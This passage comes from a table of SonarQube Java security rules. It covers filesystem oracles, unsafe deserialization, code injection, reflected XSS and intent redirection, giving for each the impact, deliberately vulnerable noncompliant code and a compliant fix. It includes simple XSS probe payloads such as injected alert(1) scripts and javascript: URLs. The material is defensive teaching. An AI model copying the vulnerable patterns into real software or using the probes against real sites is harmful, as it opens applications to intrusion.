be the secret of a particular cloud provider used in an environment variable, or <code>PATH</code>.</p>
<p>Depending on the application, the attacker can read or modify important data or perform unwanted actions.<br /> For example, injecting data into the
<code>HTTP_PROXY</code> variable could lead to data leakage.</p>
<h4>Application compromise</h4>
<p>In the worst case, an attacker manages to inject an important environment variable such as &#96; LD _PRELOAD&#96; and execute code by overriding trusted
code.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, and for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to environment variable manipulation as it constructs the variables from untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
  Runtime r &#61; Runtime.getRuntime();
  String userInput &#61; request.getParameter(&#34;example&#34;);

  if (userInput !&#61; null) {
    String[] envs &#61; {userInput};
    r.exec(&#34;/path/to/example&#34;, userInput);
  } else{
    r.exec(&#34;/path/to/example&#34;);
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
  Runtime r &#61; Runtime.getRuntime();
  String userInput &#61; request.getParameter(&#34;example&#34;);

  if (userInput !&#61; null &amp;&amp; userInput.matches(&#34;^[a-zA-Z0-9]*$&#34;)) {
    String[] envs &#61; {&#34;ENV_VAR&#61;%s&#34;.format(userInput)};
    r.exec(&#34;/path/to/example&#34;, envs);
  } else {
    r.exec(&#34;/path/to/example&#34;);
  }
}
</pre>
<h3>How does this work?</h3>
<p>User input should be properly sanitized and validated, and ideally used only for the value of the environment variable. The environment variable
name should be statically defined.</p>
<p>Validation and sanitization could be done by restricting alphanumeric characters for the value and evaluating the name, if not statically defined,
against an allowlist of name values.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/454" rel="nofollow">MITRE, CWE-454</a> - External Initialization of Trusted Variables or Data Stores </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6549">
              javasecurity:S6549
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Applications behave as filesystem oracles when they disclose to attackers if resources from the filesystem exist or not.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initially intended path. The resulting
path would resolve to a location somewhere in the filesystem which the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a filesystem oracle vulnerability can determine if a file exists or not.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
elevated privileges, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Information gathering</h4>
<p>The vulnerability is exploited to gather information about the host system. The filesystem oracle can help identify user accounts, running
services, or the exact version of installed software.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a file system oracle as it allows testing the existence of a file anywhere on the file system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.io.File;

&#64;Controller
public class ExampleController
{
    static private String targetDirectory &#61; &#34;/path/to/target/directory/&#34;;

    &#64;GetMapping(value &#61; &#34;/exists&#34;)
    public void delete(&#64;RequestParam(&#34;filename&#34;) String filename) throws IOException {

        File file &#61; new File(targetDirectory &#43; filename);
        if (!file.exists()) { // Noncompliant
            throw new IOException(&#34;File does not exists in the target directory&#34;);
        }
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.io.File;

&#64;Controller
public class ExampleController
{
    static private String targetDirectory &#61; &#34;/path/to/target/directory/&#34;;

    &#64;GetMapping(value &#61; &#34;/exists&#34;)
    public void delete(&#64;RequestParam(&#34;filename&#34;) String filename) throws IOException {

        File file &#61; new File(targetDirectory &#43; filename);
        String canonicalDestinationPath &#61; file.getCanonicalPath();

        if (!canonicalDestinationPath.startsWith(targetDirectory)) {
            throw new IOException(&#34;Entry is outside of the target directory&#34;);
        } else if (!file.exists()) {
            throw new IOException(&#34;File does not exists in the target directory&#34;);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>The universal way to avoid filesystem oracle vulnerabilities is to validate paths constructed from untrusted data:</p>
<ol><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal (see the &#34;Pitfalls&#34; section). </li><li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalPath</code>. This will resolve relative paths or
  path components like <code>../</code> and remove any ambiguity regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li></ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol><li> <code>data &#61; transform(user_input);</code> </li><li> <code>data &#61; normalize(data);</code> </li><li> <code>data &#61; sanitize(data);</code> </li><li> <code>use(data);</code> </li></ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v&#61;V-DdcKADnFk" rel="nofollow">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
static private String targetDirectory &#61; &#34;/Users/John&#34;;

&#64;GetMapping(value &#61; &#34;/endpoint&#34;)
public void endpoint(&#64;RequestParam(&#34;folder&#34;) fileName) throws IOException {

    String canonicalizedFileName &#61; fileName.getCanonicalPath();

    if (!canonicalizedFileName.startsWith(targetDirectory)) {
        throw new IOException(&#34;Entry is outside of the target directory&#34;);
    }
}
</pre>
<p>This check can be bypassed if other directories start with <code>John</code>. For instance, <code>&#34;/Users/Johnny&#34;.startsWith(&#34;/Users/John&#34;)</code>
returns <code>true</code>. Thus, for validation, <code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions, such as <code>getCanonicalPath</code>, remove the terminating path separator in their return value.<br />
The validation code should be tested to ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3" rel="nofollow">Here is a real-life example of this vulnerability.</a></p>
<h4>Do not use java.nio.file.Path.resolve as a validator</h4>
<p>As specified in the <a href="https://docs.oracle.com/javase/8/docs/api/java/nio/file/Path.html" rel="nofollow">official documentation</a>, if the given parameter
is an absolute path, the base object from which the method is called is discarded and is not included in the resulting string.</p>
<p>This means that including untrusted data in the parameter and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5135">
              javasecurity:S5135
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application performing unsafe deserialization:<br /> After detecting the injection vector, attackers inject a
carefully-crafted payload into the application.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s
behavior.</p>
<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges
or perform unwanted actions.<br /> In the context of an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code
execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate his privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class RequestProcessor {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    ServletInputStream servletIS &#61; request.getInputStream();
    ObjectInputStream  objectIS  &#61; new ObjectInputStream(servletIS);
    Object input                 &#61; objectIS.readObject();
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class SecureObjectInputStream extends ObjectInputStream {

  &#64;Override
  protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {

    List&lt;String&gt; approvedClasses &#61; new ArrayList&lt;String&gt;();
    approvedClasses.add(AllowedClass1.class.getName());
    approvedClasses.add(AllowedClass2.class.getName());

    if (!approvedClasses.contains(osc.getName())) {
      throw new InvalidClassException(&#34;Unauthorized deserialization&#34;, osc.getName());
    }

    return super.resolveClass(osc);
  }
}

public class RequestProcessor {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    ServletInputStream servletIS &#61; request.getInputStream();
    ObjectInputStream  objectIS  &#61; new SecureObjectInputStream(servletIS);
    Object input                 &#61; objectIS.readObject();
  }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>
<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br /> Therefore, our first suggestion is to
avoid deserialization in the first place.</p>
<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>
<h4>More secure serialization methods</h4>
<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>
<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br />
In this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>
<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br /> The most
common method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the
Protobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>
<h4>Integrity check</h4>
<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application
server:</p>
<ul><li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li><li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li></ul>
<p>Depending on the situation, two MAC computation modes can be used.</p>
<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC
should be preferred, with a strong underlying hash algorithm such as SHA-256.</p>
<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a
signing secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>
<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>
<h4>Pre-Approved classes</h4>
<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br /> If the untrusted class does
not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br /> Depending on the language
or framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>
<p>In the previous example, the pre-approved list uses class names to validate the deserialized class.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5334">
              javasecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br /> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Commons Compiler</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import org.codehaus.janino.ScriptEvaluator;

&#64;Controller
public class ExampleController
{
    &#64;GetMapping(value &#61; &#34;/&#34;)
    public void exec(&#64;RequestParam(&#34;message&#34;) String message) throws IOException, InvocationTargetException {
        ScriptEvaluator se &#61; new ScriptEvaluator();
        se.cook(&#34;System.out.println(\&#34; &#43; message \&#34;);&#34;);
        se.evaluate(null);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import org.codehaus.janino.ScriptEvaluator;

&#64;Controller
public class ExampleController
{
    &#64;GetMapping(value &#61; &#34;/&#34;)
    public void exec(&#64;RequestParam(&#34;message&#34;) String message) throws IOException, InvocationTargetException {
        ScriptEvaluator se &#61; new ScriptEvaluator();
        se.setParameters(new String[] { &#34;input&#34; }, new Class[] { String.class });
        se.cook(&#34;System.out.println(input);&#34;);
        se.evaluate(new Object[] { message });
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br /> Therefore, our suggestion
is to avoid executing code dynamically.<br /> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<p>The compliant code example uses such an approach.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/" rel="nofollow">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5131">
              javasecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br /> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in JSP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because JSP does not auto-escape variables.</p>
<p>User input embedded in HTML code should be HTML-encoded to prevent the injection of additional code. This can be done with the <a href="https://owasp.org/www-project-java-encoder/" rel="nofollow">OWASP Java Encoder</a> or similar libraries.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
&lt;%&#64;page contentType&#61;&#34;text/html&#34; pageEncoding&#61;&#34;UTF-8&#34;%&gt;
&lt;%&#64;taglib prefix&#61;&#34;e&#34; uri&#61;&#34;https://www.owasp.org/index.php/OWASP_Java_Encoder_Project&#34; %&gt;
&lt;!doctype html&gt;
&lt;html&gt;
 &lt;body&gt;
  &lt;h1&gt;${param.title}&lt;/h1&gt;    &lt;!-- Noncompliant --&gt;
 &lt;/body&gt;
&lt;/html&gt;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
&lt;%&#64;page contentType&#61;&#34;text/html&#34; pageEncoding&#61;&#34;UTF-8&#34;%&gt;
&lt;%&#64;taglib prefix&#61;&#34;e&#34; uri&#61;&#34;https://www.owasp.org/index.php/OWASP_Java_Encoder_Project&#34; %&gt;
&lt;!doctype html&gt;
&lt;html&gt;
 &lt;body&gt;
  &lt;h1&gt;${e:forHtml(param.title)}&lt;/h1&gt;
 &lt;/body&gt;
&lt;/html&gt;
</pre>
<h3>How does this work?</h3>
<p>Template engines are used by web applications to build HTML content. Template files contain static HTML as well as template language instruction.
These instructions allow, for example, to insert dynamic values into the document as the template is rendered.</p>
<h4>Encode data according to the HTML context</h4>
<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact
from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific
encoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>
ContextCode exampleExploit exampleEncoding <p>Inbetween tags</p> <pre>
&lt;!doctype html&gt;
&lt;div&gt;
  { data }
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  &lt;script&gt;
    alert(1)
  &lt;/script&gt;
&lt;/div&gt;
</pre> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>
        <ul><li> &amp; → &amp;amp; </li><li> &lt; → &amp;lt; </li><li> &gt; → &amp;gt; </li><li> &#34; → &amp;quot; </li><li> &#39; → &amp;#x27; </li></ul>  <p>In an attribute surrounded with single or double quotes</p> <pre>
&lt;!doctype html&gt;
&lt;div tag&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div tag&#61;&#34;&#34;
     onmouseover&#61;&#34;alert(1)&#34;&gt;
  ...
&lt;/div&gt;
</pre> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>
        <ul><li> &amp; → &amp;amp; </li><li> &lt; → &amp;lt; </li><li> &gt; → &amp;gt; </li><li> &#34; → &amp;quot; </li><li> &#39; → &amp;#x27; </li></ul>  <p>In an unquoted attribute</p> <pre>
&lt;!doctype html&gt;
&lt;div tag&#61;{ data }&gt;
  ...
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div tag&#61;foo
     onmouseover&#61;alert(1)&gt;
  ...
&lt;/div&gt;
</pre> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p>  <p>In a URL attribute</p> <pre>
&lt;!doctype html&gt;
&lt;a href&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/a&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;a href&#61;&#34;javascript:alert(1)&#34;&gt;
  ...
&lt;/a&gt;
</pre> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>
      as a scheme.</p>  <p>In a script block</p> <pre>
&lt;!doctype html&gt;
&lt;script&gt;
  { data }
&lt;/script&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  alert(1)
&lt;/script&gt;
</pre> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>
&lt;!doctype html&gt;
&lt;script data&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/script&gt;
</pre>
<p><code>org.owasp.encoder.Encode.forHtml</code> is the recommended method to encode HTML entities.</p>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br /> The following content-types are known to be affected:</p>
<ul><li> application/mathml&#43;xml </li><li> application/rdf&#43;xml </li><li> application/vnd.wap.xhtml&#43;xml </li><li> application/xhtml&#43;xml </li><li> application/xml </li><li> image/svg&#43;xml </li><li> multipart/x-mixed-replace </li><li> text/html </li><li> text/rdf </li><li> text/xml </li><li> text/xsl </li></ul>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of &#34;javascript:&#34; URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br /> <a href="https://web.dev/csp-xss/" rel="nofollow">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li><li> <a href="https://javadoc.io/doc/org.owasp.encoder/encoder/latest/index.html" rel="nofollow">OWASP Encoder</a> </li><li> <a href="https://spring.io/guides/gs/securing-web/" rel="nofollow">Spring.io, Securing a Web Application</a> </li><li> <a href="https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html" rel="nofollow">Thymeleaf.org, Tutorial: Using Thymeleaf</a> </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability" rel="nofollow">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li><li> <a href="https://blog.sonarsource.com/ghost-admin-takeover" rel="nofollow">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li><li> <a href="https://samy.pl/myspace/" rel="nofollow">Samy Kamkar, The MySpace Worm</a> </li></ul>
<h3>Conference presentations</h3>
<ul><li> <a href="https://www.youtube.com/watch?v&#61;ksq7e6UUDag" rel="nofollow">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79.html" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6384">
              javasecurity:S6384
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Intent redirection vulnerabilities occur when an application publicly exposes a feature that uses an externally provided intent to start a new
component.</p>
<p>In that case, an application running on the same device as the affected one can launch the exposed, vulnerable component and provide it with a
specially crafted intent. Depending on the application’s configuration and logic, this intent will be used in the context of the vulnerable
application, which poses a security threat.</p>
<h3>What is the potential impact?</h3>
<p>An affected component that forwards a malicious externally provided intent does so using the vulnerable application’s context. In particular, the
new component is created with the same permissions as the application and without limitations on what feature can be reached.</p>
<p>Therefore, an attacker exploiting an intent redirection vulnerability could manage to access a private application’s components. Depending on the
features privately exposed, this can lead to further exploitations, sensitive data disclosure, or even persistent code execution.</p>
<h4>Information disclosure</h4>
<p>An attacker can use the affected feature as a gateway to access other components of the vulnerable application, even if they are not exported. This
includes features that handle sensitive information.</p>
